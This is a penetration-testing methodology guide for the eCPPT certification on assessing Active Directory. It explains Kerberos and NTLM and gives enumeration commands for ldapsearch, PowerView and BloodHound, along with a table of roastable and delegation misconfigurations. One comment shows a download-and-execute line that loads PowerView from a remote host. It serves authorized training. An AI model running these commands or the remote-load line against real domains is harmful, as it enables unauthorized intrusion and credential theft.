# Phase 01 — Active Directory Assessment

> eCPPT · Methodology — INE-Cybersecurity-Certifications-Guide

## Purpose

Inside a network penetration test, Active Directory (AD) is usually the crown jewels: it authenticates users, hosts group policy, and centralizes access. This phase turns a plain "low-privilege workstation" foothold into an understanding of the domain — its structure, its authentication paths, and the misconfigurations that lead to domain compromise. All techniques below must be executed only inside environments you are authorized to test (your own lab, a training range, or a signed engagement).

## Key AD Concepts (from an Attacker's View)

- **Domain vs. forest:** a *domain* is an administrative boundary (one database of objects, one set of policies); a *forest* is the security boundary — one or more domains sharing a common schema, configuration partition, and Global Catalog. Trusts between domains/forests are attack paths only if they are actually used.
- **Objects:** users, computers, groups, and organizational units (OUs). OUs group objects to apply Group Policy and delegation — never confuse "OU" (container) with "group" (security principal).
- **Groups:** *Domain Local* (access to resources in the local domain), *Global* (groups of accounts), *Universal* (usable across the forest via GC). Watch for highly privileged groups: Domain Admins, Enterprise Admins, Administrators, Backup Operators, and nested membership (a user can inherit DA through several group links).
- **GPO (Group Policy Object):** settings applied at site → domain → OU scope. GPOs can push startup scripts, registry keys, scheduled tasks, and local admin memberships — a writable GPO or a link on a container you control is a persistence/privilege primitive.
- **DNS:** AD-integrated DNS is required for the *DC locator* (`_ldap._tcp.dc._msdcs.<domain>` SRV records). Poisoning or controlling DNS lets you redirect authentication and tooling traffic.
- **What an attacker keeps asking:** Who is here, what can they do, where do they log in, and which object can I abuse to reach a Domain Admin or the KRBTGT account?

## Authentication Protocols — the Basics

### Kerberos (default for AD)

1. Client asks the **AS** for a **TGT**, encrypted with the `krbtgt` key (AS-REQ/AS-REP). Pre-authentication can be disabled per user — the AS-REP roast.
2. Client presents the TGT to the **TGS** and requests a **service ticket** for a Service Principal Name (SPN); the ticket is encrypted with the *target service account's* key — the Kerberoast primitive.
3. Client presents the service ticket to the target service, which validates it against its own key and the PAC (Privilege Attribute Certificate).

```text
# Mental model (protocol flow)
Client --AS-REQ(user, timestamp enc w/ password)--> KDC(AS)
KDC   --AS-REP(TGT enc w/ krbtgt key)-------------> Client
Client --TGS-REQ(TGT, SPN)------------------------> KDC(TGS)
KDC   --TGS-REP(service ticket enc w/ svc key)----> Client
Client --AP-REQ(service ticket)-------------------> Target service
```

### NTLM (challenge/response, legacy but everywhere)

The client proves knowledge of the **NT hash** (MD4 of the password). The server sends a challenge; the client returns an NTLMv2 response. An attacker who relays or captures this exchange gets a **Net-NTLMv2 hash** (crackable offline) — while a captured *NT hash* enables Pass-the-Hash without knowing the password.

## Enumeration Playbook

Start with valid, low-privilege credentials or an authenticated foothold; never guess without scope.

### 1. LDAP with ldapsearch (Kali Linux)

```bash
# Find the domain and a DC first
nmap -p 389,636 --script ldap-rootdse <DC-IP>

# Anonymous bind test (rarely works on modern DCs, always worth 10 seconds)
ldapsearch -x -H ldap://<DC-IP> -b "" -s base namingContexts

# Authenticated user enumeration against the default naming context
ldapsearch -x -H ldap://<DC-IP> -D "CORP\jdoe" -w 'P@ssw0rd!' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
# Expected outcome: one sAMAccountName per line; hunt "description" for leaked passwords
```

### 2. PowerView (PowerShell, in-memory)

```powershell
# Load into memory: IEX (New-Object Net.WebClient).DownloadString('http://kali/PowerView.ps1')
Get-Domain            # basic domain info: name, SID, DC, forest
Get-DomainUser -SPN   # Kerberoastable accounts
Get-DomainGroup -Identity "Domain Admins" | Select -Expand Member
Get-DomainComputer -Unconstrained        # delegation targets
Find-DomainShare                        # readable shares incl. non-standard names
Get-DomainGPO | Select DisplayName, gpcfilesyspath   # GPO inventory
Find-DomainUserLocation                 # where high-value users are logged on (needs sessions)
```

### 3. BloodHound / SharpHound — map the attack graph

```powershell
# On a Windows host you control (authorized lab)
SharpHound.exe -c All --zipfilename loot.zip    # default: All collection methods
```

```bash
# From Kali against a DC (bloodhound-python, Linux collector)
bloodhound-python -u jdoe -p 'P@ssw0rd!' -d corp.local -ns <DC-IP> -c All
# Then: neo4j start  &&  bloodhound  -> import the resulting .zip/.json
```

BloodHound answers: "Shortest path to Domain Admins," "users with `GenericAll`/`WriteDACL`," "principals that can `ReadLAPSPassword`," and "sessions of high-value users." Mark the imported data as the lab's network to avoid mixing tenants.

## Spotting Common Misconfigurations

| Finding | Why it matters | How to check |
|---|---|---|
| Password in `description` field | Instant valid credentials | `ldapsearch ... description` / PowerView `Get-DomainUser` |
| `userAccountControl: PASSWD_NOTREQD`, disabled pre-auth | AS-REP roasting | `Get-DomainUser -PreauthNotRequired` |
| Weak SPN (service) account passwords | Kerberoasting | `Get-DomainUser -SPN` → crack hashes |
| Unconstrained / constrained delegation | Ticket theft / delegation abuse | `Get-DomainComputer -Unconstrained` |
| `GenericAll`/`WriteDACL`/`GenericWrite` on objects | Full object takeover chains | BloodHound edges |
| Users in privileged groups / nested admin groups | Trivial lateral paths | `Get-DomainGroupMember` recursively |
| SMB signing disabled, LLMNR/mDNS/NBT-NS on | Credential relay/poisoning | `nmap --script smb2-security-mode`; Responder test |
| Legacy protocols or no LAPS for local admins | Shared local-admin hashes | check for LAPS attribute `ms-Mcs-AdmPwd` |

## Common Mistakes & Tips

- **Enumerating before you know the domain name:** run `nmap`/`whoami`/`nltest /dsgetdc:<domain>` or read DNS first; LDAP queries need the correct base DN (`DC=corp,DC=local`).
- **LDAP typos with `-b`:** always confirm the naming context with `-s base namingContexts` before scripting the full query.
- **BloodHound data hygiene:** one Neo4j DB per lab; import with the correct domain so Shortest-Path answers stay meaningful.
- **Skipping "boring" checks:** default shares, print spooler, SMB signing, and password-in-description turn up in real engagements more often than exotic exploits.
- **Document everything as you go:** the same commands become your report evidence (see Phase 05).
- **Stay in scope:** LDAP/BloodHound collection touches a lot of objects — throttle, use authenticated queries, and avoid destructive changes to objects.

## Checklist / Self-test

- [ ] I can explain domain vs. forest, and name the default high-privilege groups and their scope.
- [ ] I can describe the Kerberos AS/TGS exchange and where TGT and service tickets get encrypted.
- [ ] I can explain the difference between an NT hash and a Net-NTLMv2 response and what each enables.
- [ ] I can run `ldapsearch` with an authenticated bind and filter for users, SPNs, and descriptions.
- [ ] I can reproduce the PowerView commands above and interpret their output.
- [ ] I can collect data with SharpHound/`bloodhound-python` and run Shortest Path / GenericAll queries.
- [ ] I can spot at least six AD misconfigurations from enumeration output and say which attack each feeds.

## Further Resources

- Microsoft Learn — Active Directory Domain Services overview: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview
- Microsoft Learn — Kerberos authentication overview: https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview
- MITRE ATT&CK — Active Directory discovery techniques (T1087/T1069/T1482): https://attack.mitre.org/
- BloodHound documentation: https://bloodhound.readthedocs.io/
- HackTricks — Active Directory methodology: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology.html
- PowerView wiki (BC-SECURITY): https://github.com/PowerShellMafia/PowerSploit (reference only — use a maintained fork in labs)
